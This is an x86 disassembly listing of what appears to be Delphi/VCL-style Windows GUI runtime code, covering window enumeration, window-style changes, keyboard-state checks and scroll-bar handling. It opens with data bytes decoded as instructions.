add [ eax - 0x20 ] ah
inc ebx
add [ eax + 0x43 ] ah
add [ eax + edx * 2 - 0x213bffbb ] ah
inc ebx
add [ ebx + ecx ] bh
inc esp
add [ eax + 0x7c004557 ] bl
sbb al 0x44
add [ eax - 0x53ffbbf9 ] bh
insb
inc ebp
add [ eax ] dh
and al [ ebp ]
loopne r-xdata
inc ebx
inc ebp
add [ ecx ] cl
add [ eax + eax - 0x4fd3ff5f ] al
inc edx
mov al 0x39
mov al 0xb
mov al 0xc5
inc ebp
add [ ebp + ebx * 2 + 0x2dc80045 ] cl
inc ebp
add [ esi + ebp + 0x45 ] al
add [ eax + esi * 2 + 0x2b000045 ] cl
inc ebp
add [ eax + 0x7000456b ] dl
push edx
inc ebp
add [ ebp + ebp * 2 + 0x45 ] al
add [ eax ] ch
cmp [ ebp ] al
or [ eax ] eax
test [ eax ] al
mov eax [ 0x42b02c00 ]
sub_450d98
mov edi 0xc0ffbdff
ja r-xdata
insd
add al ch
ja r-xdata
cmp al 0x10
inc eax
add [ eax ] bl
inc edi
inc ebp
add [ edi + eax * 2 ] ch
add [ eax + edx ] bh
add [ esi + edi * 8 + 0xe0044 ] al
add eax 0x6d726f46
add [ eax - 0x27ffba88 ] al
js r-xdata
xor [ eax ] al
hlt
outsb
arpl [ eax - 0x70 ] bp
insb
push cs
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc esi
outsd
jb r-xdata
add [ ecx + edi * 2 + 0x79c40045 ] ch
inc ebp
add [ esi + esi * 2 + 0x45 ] al
add [ eax ] ch
ja r-xdata
push ebx
arpl [ edx + 0x65 ] si
outsb
mov eax eax
adc al 0xf
inc ebp
add [ edi ] al
pop es
push esp
push ebx
arpl [ edx + 0x65 ] si
outsb
les ecx [ esi ]
inc ebp
add [ edi ] dh
inc ecx
add [ edx ] al
add [ 0x6d726f46 ] al
jae r-xdata
add [ esp + eax * 2 ] cl
inc ecx
add ah cl
fwait
inc ecx
add [ eax ] ch
inc ebx
inc ecx
add [ esp + ebx * 4 - 0x648fffbf ] ah
inc ecx
add [ esp + ebx * 4 - 0x6253ffbf ] dh
inc ecx
add ah bl
lahf
inc ecx
add ah al
pushfd
inc ecx
add [ esp + ebx * 4 - 0x601bffbf ] bh
inc ecx
add al cl
jpe r-xdata
xor [ eax ] al
mov eax 0xf4004030
jae r-xdata
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x500d000d ] al
imul edi [ eax + 0x65 ] 0x6550736c
jb r-xdata
inc edi
add [ edi + esi * 2 + 0x540f0045 ] dl
inc ebx
jne r-xdata
add [ eax + r-xdata ] dl
push cs
or [ eax + ecx * 2 + 0x69 ] edx
outsb
je r-xdata
imul ebp [ esi + 0x74 ] 0x6f666e49
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + edx + 0x380040 ] dl
add [ eax ] al
pop es
push esp
add [ eax + eax ] cl
add [ eax ] al
mov al [ 0x4c004010 ]
xor eax [ eax ]
pop eax
xor eax [ eax ]
pop esp
xor eax [ eax ]
pushad
xor eax [ eax ]
push esp
xor eax [ eax ]
pushfd
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
insb
push cs
inc ebp
je r-xdata
cdq
inc ecx
add [ eax + 0x33 ] ah
inc eax
add [ ebx + esi + 0x40 ] dl
add [ eax + esi + 0x30b80040 ] bl
inc eax
add [ eax + 0xc00458d ] bl
inc esp
inc ecx
add ah cl
fwait
inc ecx
add [ eax ] ch
inc ebx
inc ecx
add [ esp + ebx * 4 - 0x648fffbf ] ah
inc ecx
add [ esp + ebx * 4 - 0x6253ffbf ] dh
inc ecx
add ah bl
lahf
inc ecx
add ah al
pushfd
inc ecx
add [ esp + ebx * 4 - 0x601bffbf ] bh
inc ecx
add [ ebx + ecx * 4 + 0xe0045 ] ch
add [ eax ] al
add [ eax ] al
push es
add [ eax ] al
add [ eax + edx + 0x380040 ] dl
add [ eax ] al
xchg esp eax
adc [ eax ] al
cmp al 0x0
add [ eax ] al
movsb [ edi ] [ esi ]
dec esp
inc edx
add [ eax + eax ] cl
add [ eax + edx + 0x500040 ] dl
add [ eax ] al
xchg esp eax
adc [ eax ] al
push esp
add [ eax ] al
add [ eax + edx + 0x8c0040 ] dl
add [ eax ] al
or al 0x54
inc ecx
jo r-xdata
inc eax
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + edx + 0x380040 ] dl
add [ eax ] al
nop
pushfd
cmovne eax [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
int3
outsb
outsw
add [ eax ] al
insd
inc esp
outsd
arpl [ ebx + 0x46 ] bp
outsd
jb r-xdata
sti
[ edx + 0x37 ]
insb
imul esp [ ebx + 0x61 ] 0x6e6f6974
nop
sbb [ eax ] dl
inc ebp
add [ edi ] al
or al 0x54
inc ecx
jo r-xdata
add [ eax ] al
add [ esi + ecx + 0x45 ] ch
aam 0xd
inc ebp
add [ edi ] al
andps xmm0 [ ebx + 0x75 ]
jae r-xdata
[ esi + 0x5b ]
retn
insb
imul esp [ ebx + 0x61 ] 0x6e6f6974
pushfd
cmovne eax [ eax ]
xor al 0x27
inc ecx
add [ edx ] al
add [ 0x6d726f46 ] al
jae r-xdata
xor [ eax ] al
or [ ebp + ecx * 2 + 0x6f ] dl
outsb
imul esi [ edi + ebp * 2 + 0x72 ] 0xc400408d
push cs
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah dh
push cs
inc ebp
add [ edi + ecx ] dl
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi ] al
cmovne eax [ eax ]
mov al [ 0x38000000 ]
inc ecx
add ah al
lahf
inc ecx
add [ eax + 0x33 ] bl
inc eax
add [ eax ] bl
cdq
inc ecx
add [ eax + 0x33 ] ah
inc eax
add [ ebx + esi + 0x40 ] dl
add [ eax + esi + 0x30b80040 ] bl
inc eax
add [ eax ] ah
jl r-xdata
add [ eax + 0x33 ] bl
outsd
insd
inc esp
outsd
arpl [ ebx + 0x46 ] bp
outsd
jb r-xdata
add [ ecx + rw-data ] ah
retn
inc eax
add [ ebx + esi + 0x40 ] bl
add [ eax + 0x33 ] ah
inc eax
add [ ebx + esi + 0x40 ] dl
add [ eax + esi + 0x30b80040 ] bl
inc eax
add ah dh
xchg esp eax
or al 0x45
sub_451048
push ebx
push esi
mov ebx edx
mov esi eax
test esi esi
je r-xdata
pop esi
pop ebx
retn
push 0xffffffec
push esi
call GetWindowLongA
test bl bl
je r-xdata
test ah 0x2
je r-xdata
test ah 0x2
jne r-xdata
and eax 0xfffffdff
or eax 0x200
jmp r-xdata
push eax
push 0xffffffec
push esi
call SetWindowLongA
push 0x37
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push esi
call SetWindowPos
sub_451094
mov eax [ rw-data ]
mov eax [ eax + 0x30 ]
test eax eax
je r-xdata
xor edx edx
mov eax [ rw-data ]
call sub_45a794
mov eax [ rw-data ]
call sub_419af4
mov eax [ rw-data ]
call sub_419a9c
retn
push 0x0
push eax
call ShowOwnedPopups
sub_4510cc
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
cmp ebx [ rw-data ]
je r-xdata
or eax 0xffffffff
pop ebx
pop ebp
retn 0x8
push ebx
call IsWindowVisible
test eax eax
je r-xdata
push ebx
call IsWindowEnabled
test eax eax
je r-xdata
mov eax 0x8
call sub_4026bc
mov edx [ rw-data ]
mov [ eax ] edx
mov [ eax + 0x4 ] ebx
mov [ rw-data ] eax
push 0x0
push ebx
call EnableWindow
sub_45111c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x4 ] edx
mov edx [ rw-data ]
mov [ ebp - 0x8 ] edx
mov edx [ rw-data ]
mov [ ebp - 0xc ] edx
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
push ebp
push sub_4511bf
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push sub_451188
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
push sub_4510cc
call GetCurrentThreadId
push eax
call EnumThreadWindows
mov eax [ rw-data ]
mov [ ebp - 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4511c6
mov eax [ ebp - 0xc ]
mov [ rw-data ] eax
mov eax [ ebp - 0x8 ]
mov [ rw-data ] eax
retn
sub_4511d0
push ebx
push esi
mov esi eax
test esi esi
je r-xdata
pop esi
pop ebx
retn
mov ebx esi
mov eax [ ebx + 0x4 ]
push eax
call IsWindow
test eax eax
je r-xdata
mov esi [ ebx ]
mov edx 0x8
mov eax ebx
call sub_4026dc
test esi esi
jne r-xdata
push 0xffffffff
mov eax [ ebx + 0x4 ]
push eax
call EnableWindow
sub_451208
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
cmp ebx [ rw-data ]
je r-xdata
or eax 0xffffffff
pop ebx
pop ebp
retn 0x8
mov eax [ rw-data ]
cmp ebx [ eax + 0x30 ]
je r-xdata
push ebx
call IsWindowVisible
test eax eax
je r-xdata
push ebx
call IsWindowEnabled
test eax eax
je r-xdata
push 0xffffffec
push ebx
call GetWindowLongA
test al 0x8
jne r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
mov [ rw-data ] ebx
mov [ rw-data ] ebx
jmp r-xdata
sub_45126c
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
push 0x0
push sub_451208
call GetCurrentThreadId
push eax
call EnumThreadWindows
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
retn
mov eax [ rw-data ]
retn
sub_4512c8
push ebp
mov ebp esp
push ebx
mov eax [ ebp + 0xc ]
or edx 0xffffffff
mov ecx eax
mov ebx [ ecx ]
cmp ebx [ ebp + 0x8 ]
jne r-xdata
mov eax edx
pop ebx
pop ebp
retn 0x8
xor edx edx
mov [ ecx + 0x4 ] 0x1
sub_4512e8
add esp 0xfffffff8
call GetActiveWindow
mov [ esp ] eax
mov [ esp + 0x4 ] 0x0
mov eax esp
push eax
push sub_4512c8
call GetCurrentThreadId
push eax
call EnumThreadWindows
mov al [ esp + 0x4 ]
pop ecx
pop edx
retn
sub_451314
push ebx
push esi
push edi
push ebp
mov ebp eax
mov eax [ rw-data ]
call sub_457d74
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ rw-data ]
call sub_4581e4
mov esi eax
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
xor ebx ebx
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov edx [ ebx + 0x8 ]
mov eax ebp
call sub_407af0
test eax eax
je r-xdata
mov eax ebx
pop ebp
pop edi
pop esi
pop ebx
retn
inc edi
dec esi
jne r-xdata
mov edx edi
mov eax [ rw-data ]
call sub_457d60
mov ebx eax
test [ ebx + 0x1d ] 0x2
jne r-xdata
mov edx edi
mov eax [ rw-data ]
call sub_4581d0
mov ebx eax
mov edx [ ebx + 0x8 ]
mov eax ebp
call sub_407af0
test eax eax
je r-xdata
sub_451394
push ebx
push esi
mov esi eax
mov bl [ r-xdata ]
test si 0x4
je r-xdata
test si 0x8
je r-xdata
or bl 0x1
test si 0x1
je r-xdata
or bl 0x4
test si 0x2
je r-xdata
or bl 0x8
test si 0x10
je r-xdata
or bl 0x10
push 0x12
call GetKeyState
test ax ax
jge r-xdata
or bl 0x20
mov eax ebx
pop esi
pop ebx
retn
or bl 0x2
sub_4513e8
push ebx
push esi
mov esi eax
mov bl [ r-xdata ]
push 0x10
call GetKeyState
test ax ax
jge r-xdata
push 0x11
call GetKeyState
test ax ax
jge r-xdata
or bl 0x1
test esi 0x20000000
je r-xdata
or bl 0x4
mov eax ebx
pop esi
pop ebx
retn
or bl 0x2
sub_451424
push ebx
push esi
mov esi eax
mov bl [ r-xdata ]
test [ esi + 0x10 ] 0x80
je r-xdata
test [ esi + 0x11 ] 0x80
je r-xdata
or bl 0x1
test [ esi + 0x12 ] 0x80
je r-xdata
or bl 0x4
test [ esi + 0x1 ] 0x80
je r-xdata
or bl 0x2
test [ esi + 0x2 ] 0x80
je r-xdata
or bl 0x8
test [ esi + 0x4 ] 0x80
je r-xdata
or bl 0x10
mov eax ebx
pop esi
pop ebx
retn
or bl 0x20
sub_451470
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_4514ce
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_44f02c
mov eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x8 ]
mov edx ebx
call sub_40403c
mov eax [ ebp - 0x8 ]
pop edx
call sub_407af0
test eax eax
sete al
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4514d5
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403e78
retn
sub_4514e0
push ebx
mov ebx eax
jmp r-xdata
mov eax [ ebx + 0x30 ]
test eax eax
jne r-xdata
mov ebx eax
mov eax ebx
mov edx [ r-xdata ]
call sub_403290
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax ebx
pop ebx
retn
sub_451508
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
xor edx edx
mov [ ebp - 0xc ] edx
mov esi eax
xor eax eax
push ebp
push sub_451579
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_4514e0
mov ebx eax
test ebx ebx
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_451580
lea eax [ ebp - 0xc ]
call sub_403e54
retn
mov eax [ esi + 0x8 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x8 ]
push eax
push 0x0
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_4059b8
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b55c
call sub_403890
sub_451588
push ebp
mov ebp esp
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_4030d4
mov [ edi + 0x4 ] esi
mov al [ ebp + 0x8 ]
mov [ edi + 0x18 ] al
mov cx 0x50
mov [ edi + 0xa ] cx
movzx eax cx
mov ecx 0xa
xor edx edx
div ecx
mov [ edi + 0x8 ] ax
mov [ edi + 0x1c ] 0x1
mov [ edi + 0x20 ] 0xa
mov [ edi + 0x40 ] 0x4
mov [ edi + 0x3c ] 0xc
mov [ edi + 0x28 ] 0xff000014
mov [ edi + 0x2c ] 0x1
mov [ edi + 0x44 ] 0x1
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403428
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
call sub_403480
pop [ fs : 0x0 ]
add esp 0xc
sub_451618
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ r-xdata ]
call sub_403290
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_414328
mov edi esi
mov dl [ edi + 0x1c ]
mov eax ebx
call sub_451ee0
mov edx [ edi + 0x10 ]
mov eax ebx
call sub_451ec0
mov edx [ edi + 0xc ]
mov eax ebx
call sub_451d70
mov ax [ edi + 0x8 ]
mov [ ebx + 0x8 ] ax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_451668
push ebx
mov ebx eax
cmp [ ebx + 0x18 ] 0x0
jne r-xdata
pop ebx
retn
mov eax ebx
call sub_451820
test al al
je r-xdata
mov eax [ ebx + 0x4 ]
call sub_43a9b4
test al al
jne r-xdata
mov edx [ ebx + 0x10 ]
mov eax ebx
call sub_451d70
xor edx edx
mov eax ebx
call sub_451d70
jmp r-xdata
sub_4516a0
push ebp
mov ebp esp
push ebx
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
pop ebx
pop ebp
retn
mov al [ ebx + 0x5b ]
sub al 0x1
jb r-xdata
cmp [ ebx + 0x5b ] 0x3
je r-xdata
sub al 0x2
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ eax + 0xc ]
add edx [ ebx + 0x40 ]
add edx [ ebx + 0x48 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_4240b8
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
jmp r-xdata
mov al [ r-xdata ]
and al [ ebx + 0x61 ]
mov dl [ r-xdata ]
cmp dl al
jne r-xdata
dec al
je r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebx + 0x48 ]
add [ eax - 0xc ] edx
jmp r-xdata
sub_45170c
push ebp
mov ebp esp
push ebx
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
pop ebx
pop ebp
retn
mov al [ ebx + 0x5b ]
sub al 0x2
jb r-xdata
cmp [ ebx + 0x5b ] 0x1
je r-xdata
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ eax + 0xc ]
add edx [ ebx + 0x44 ]
add edx [ ebx + 0x4c ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_4240b8
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
jmp r-xdata
mov al [ r-xdata ]
and al [ ebx + 0x61 ]
mov dl [ r-xdata ]
cmp dl al
jne r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebx + 0x4c ]
add [ eax - 0xc ] edx
jmp r-xdata
sub_451774
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
mov ebx [ eax + 0x4 ]
cmp [ ebx + 0x210 ] 0x0
je r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc8 ]
test al al
je r-xdata
xor edx edx
mov eax [ ebp - 0x8 ]
call sub_451ea8
xor eax eax
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
call sub_43d858
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov edx [ ebp - 0x4 ]
add edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
movzx eax [ eax + 0x1a ]
add edx eax
mov eax [ ebp - 0x8 ]
call sub_451ea8
jmp r-xdata
inc ebx
xor esi esi
push ebp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov edx esi
call sub_43d81c
call sub_45170c
pop ecx
push ebp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov edx esi
call sub_43d81c
call sub_4516a0
pop ecx
jmp r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x18 ] 0x0
jne r-xdata
inc esi
dec ebx
jne r-xdata
sub_451820
push ebx
push esi
mov ebx eax
mov esi 0x100000
cmp [ ebx + 0x18 ] 0x1
jne r-xdata
cmp [ ebx + 0x1c ] 0x0
je r-xdata
mov esi 0x200000
xor eax eax
pop esi
pop ebx
retn
push 0xfffffff0
mov eax [ ebx + 0x4 ]
call sub_440b28
push eax
call GetWindowLongA
test eax esi
jne r-xdata
mov al 0x1
pop esi
pop ebx
retn
sub_451858
push ebp
mov ebp esp
push ebx
mov ebx 0x100000
cmp ax 0x1
jne r-xdata
push 0xfffffff0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_440b28
push eax
call GetWindowLongA
test eax ebx
setne al
pop ebx
pop ebp
retn
mov ebx 0x200000
sub_45188c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi edx
mov esi eax
xor ebx ebx
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x5 ] 0x0
jne r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x6 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x6 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax esi
call sub_451858
pop ecx
test al al
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax esi
call sub_451858
pop ecx
test al al
je r-xdata
movzx eax di
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov ebx eax
mov eax [ ebp + 0x8 ]
sub ebx [ eax - 0xc ]
neg ebx
jmp r-xdata
movzx eax di
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov ebx eax
mov eax [ ebp + 0x8 ]
sub ebx [ eax - 0xc ]
sub_451908
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov [ ebp - 0x6 ] cl
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
push 0xfffffff0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_440b28
push eax
call GetWindowLongA
test eax 0x840000
setne al
and eax 0x7f
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x18 ] 0x1
jne r-xdata
push ebp
mov dx 0x14
mov ax 0x1
call sub_45188c
pop ecx
mov ebx eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_439d50
add ebx eax
mov eax ebx
push ebp
mov dx 0x15
xor eax eax
call sub_45188c
pop ecx
mov ebx eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_439d94
add ebx eax
mov eax ebx
jmp r-xdata
pop ebx
mov esp ebp
pop ebp
retn
sub_4519a0
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
mov [ ebp - 0x1c ] 0x1c
mov [ ebp - 0x18 ] 0x10
xor ebx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x18 ] 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
mov esi [ eax - 0x8 ]
movsx esi [ esi + 0x6 ]
lea eax [ ebp - 0x1c ]
push eax
push ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_440b28
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
test eax eax
je r-xdata
mov ebx 0x1
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov esi [ ebp - 0x4 ]
sub_451a00
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1f ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
movsx eax [ eax + 0x4 ]
cmp eax 0x7
ja r-xdata
mov eax [ ebp - 0x8 ]
mov ax [ eax + 0x4 ]
sub ax 0x4
jae r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
jmp [ eax * 4 + jump_table_451bd1 ]
mov eax [ ebp - 0x8 ]
mov ax [ eax + 0x4 ]
sub ax 0x2
jb r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x8 ]
sub edx eax
mov eax [ ebp - 0x4 ]
call sub_451d70
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x8 ]
add edx eax
mov eax [ ebp - 0x4 ]
call sub_451d70
jmp r-xdata
xor ecx ecx
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_451908
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0xc ]
sub edx eax
mov eax [ ebp - 0x4 ]
call sub_451d70
jmp r-xdata
xor ecx ecx
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_451908
mov edx eax
mov eax [ ebp - 0x4 ]
add edx [ eax + 0xc ]
mov eax [ ebp - 0x4 ]
call sub_451d70
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x14 ] 0x7fff
jle r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1d ] 0x0
je r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_451d70
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_451d70
mov eax [ ebp - 0x4 ]
movzx ebx [ eax + 0x8 ]
mov eax ebx
mov edx [ ebp - 0x4 ]
mov ecx [ edx + 0x40 ]
cdq
idiv ecx
mov [ ebp - 0xc ] eax
mov eax ebx
cdq
idiv ecx
mov [ ebp - 0x10 ] edx
mov esi ecx
jmp r-xdata
sub ax 0x2
jb r-xdata
mov edx [ ebp - 0x8 ]
movsx edx [ edx + 0x6 ]
mov eax [ ebp - 0x4 ]
call sub_451d70
jmp r-xdata
push ebp
call sub_4519a0
pop ecx
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_451d70
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x14 ] 0x7fff
jle r-xdata
xor edi edi
test esi esi
jle r-xdata
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0xa ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x3c ]
mov eax [ ebp - 0xc ]
cdq
idiv ecx
mov [ ebp - 0x10 ] edx
mov eax [ ebp - 0xc ]
cdq
idiv ecx
mov [ ebp - 0xc ] eax
mov esi ecx
jmp r-xdata
jmp r-xdata
mov edx [ ebp - 0x8 ]
movsx edx [ edx + 0x6 ]
mov eax [ ebp - 0x4 ]
call sub_451d70
jmp r-xdata
push ebp
call sub_4519a0
pop ecx
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_451d70
jmp r-xdata
cmp [ ebp - 0x10 ] 0x0
jle r-xdata
call sub_4067d4
mov ebx eax
mov eax ebx
sub eax edi
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x20 ]
cmp eax edx
jge r-xdata
xor esi esi
xor eax eax
mov [ ebp - 0xc ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x8 ]
mov ax [ eax + 0x4 ]
sub ax 0x1
jb r-xdata
mov edi ebx
mov eax [ ebp - 0x8 ]
mov ax [ eax + 0x4 ]
sub ax 0x1
jb r-xdata
sub edx eax
push edx
call Sleep
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
sub edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_451d70
jmp r-xdata
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
sub edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_451d70
jmp r-xdata
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
add edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_451d70
jmp r-xdata
dec ax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x88 ]
dec esi
test esi esi
jg r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
add edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_451d70
jmp r-xdata
dec ax
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
sub edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_451d70
jmp r-xdata
dec ax
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
sub edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_451d70
jmp r-xdata
dec ax
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
add edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_451d70
jmp r-xdata
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
add edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_451d70
jmp r-xdata
sub_451cf8
push ebx
push esi
mov ebx eax
cmp edx [ ebx + 0x24 ]
je r-xdata
pop esi
pop ebx
retn
mov esi edx
test esi esi
jne r-xdata
mov [ ebx + 0x24 ] edx
mov [ ebx + 0x44 ] 0x1
mov eax [ ebx + 0x4 ]
call sub_4523e8
test esi esi
jne r-xdata
xor eax eax
mov al [ ebx + 0x18 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edx eax
xor eax eax
mov [ ebx + 0x24 ] eax
sub_451d70
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebx + 0x4 ]
test [ eax + 0x1c ] 0x2
je r-xdata
mov eax [ ebx + 0x14 ]
cmp edx eax
jle r-xdata
mov [ ebx + 0xc ] edx
jmp r-xdata
test edx edx
jge r-xdata
mov edx eax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
cmp [ ebx + 0x18 ] 0x0
jne r-xdata
xor edx edx
mov si 0x1
xor esi esi
jmp r-xdata
movzx edi si
push edi
